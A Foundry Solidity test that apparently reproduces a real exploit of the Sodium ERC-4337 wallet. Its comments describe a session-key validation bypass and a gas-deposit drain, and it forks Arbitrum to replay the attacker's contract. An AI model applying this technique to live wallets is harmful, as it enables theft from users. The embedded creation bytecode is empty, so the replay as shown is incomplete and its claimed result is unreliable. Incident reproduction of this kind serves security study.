pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Sodium (ERC-4337 ZK/MPC smart wallet) — session-key validation-bypass + EntryPoint
// gas-deposit griefing. ~11.76 ETH (~$21.2k) drained from 300+ wallets in ONE tx, Arbitrum.
//
// Root cause: `_validateSignature` on the `executeWithSodiumAuthSession` path returns
// "valid" whenever `sessionKey == signer` and no safe-session is set — it never verifies
// the session-add auth proof (that check only runs later, in execution, not validation).
// Attacker signs userOps with its own EIP-1271 contract (isValidSignature always true) and
// a self-chosen sessionKey, so validateUserOp passes for ~300 wallets it doesn't own.
// Each op sets maxFeePerGas ~4062 gwei (~400,000x normal) with callGasLimit=0 and a
// deliberate out-of-gas on execution, so EntryPoint charges ~0.5 ETH of each wallet's
// gas deposit to the attacker (beneficiary) per op.
//
// Exploit tx: 0x738995176c3bbd22f8deabd7a1e6b89a044231781b39aa2f350897535e6d7bc1
// This was a CREATE tx (`to` is empty) — the entire attack runs inside the constructor
// of a one-shot contract, which loops all 300 victim wallets and self-destructs.
// Attacker/beneficiary: 0x7bD736631Afbe1d3795a94F60574f7fA0aE89347
//
// PoC strategy: fork one block before the exploit tx, prank the attacker address (the
// constructor hard-checks msg.sender == attacker), and deploy the EXACT creation bytecode
// via raw CREATE. The constructor replays the whole attack and self-destructs, exactly as
// it did on mainnet.
//
// Run: forge test --contracts ./src/test/2026-07/Sodium_exp.sol -vvv --evm-version cancun
// Requires an archive Arbitrum RPC (see foundry.toml [rpc_endpoints] "arbitrum").

interface IEntryPointV06 {
    function balanceOf(address account) external view returns (uint256);
}

contract SodiumExp is Test {
    address constant ATTACKER = 0x7bD736631Afbe1d3795a94F60574f7fA0aE89347;
    address constant ENTRYPOINT_V06 = 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789;

    // Real victim wallets, from the exploit tx's UserOperationEvent logs (topic2).
    address constant VICTIM_1 = 0x65DE72bD1897B017C91f41c86de2B15873320804;
    address constant VICTIM_2 = 0x9Ba99e76f2bE6571ae1bf82420621211EFD45236;

    uint256 constant EXPLOIT_BLOCK = 483046805; // block of the CREATE tx

    bytes constant CREATION_CODE = hex"";

    function setUp() public {
        vm.createSelectFork("arbitrum", EXPLOIT_BLOCK - 1);
        vm.label(ATTACKER, "Attacker/Beneficiary");
        vm.label(ENTRYPOINT_V06, "EntryPointV06");
        vm.label(VICTIM_1, "SodiumVictim1");
        vm.label(VICTIM_2, "SodiumVictim2");
    }

    function testExploit() public {
        uint256 victim1DepositBefore = IEntryPointV06(ENTRYPOINT_V06).balanceOf(VICTIM_1);
        uint256 victim2DepositBefore = IEntryPointV06(ENTRYPOINT_V06).balanceOf(VICTIM_2);
        uint256 attackerBalBefore = ATTACKER.balance;

        emit log_named_uint("victim1 EntryPoint deposit before", victim1DepositBefore);
        emit log_named_uint("victim2 EntryPoint deposit before", victim2DepositBefore);

        vm.prank(ATTACKER, ATTACKER); // tx.origin guard in constructor requires BOTH sender and origin == attacker
        address deployed;
        bytes memory code = CREATION_CODE;
        assembly {
            deployed := create(0, add(code, 0x20), mload(code))
        }

        uint256 victim1DepositAfter = IEntryPointV06(ENTRYPOINT_V06).balanceOf(VICTIM_1);
        uint256 victim2DepositAfter = IEntryPointV06(ENTRYPOINT_V06).balanceOf(VICTIM_2);
        uint256 attackerBalAfter = ATTACKER.balance;

        emit log_named_uint("victim1 EntryPoint deposit after", victim1DepositAfter);
        emit log_named_uint("victim2 EntryPoint deposit after", victim2DepositAfter);
        emit log_named_uint("attacker ETH gained", attackerBalAfter - attackerBalBefore);

        uint256 gained = attackerBalAfter - attackerBalBefore;
        // Reported loss was ~11.76 ETH; assert within a tight tolerance of that figure.
        assertApproxEqAbs(gained, 11.76 ether, 0.05 ether, "attacker ETH gain does not match reported ~11.76 ETH loss");
    }
}
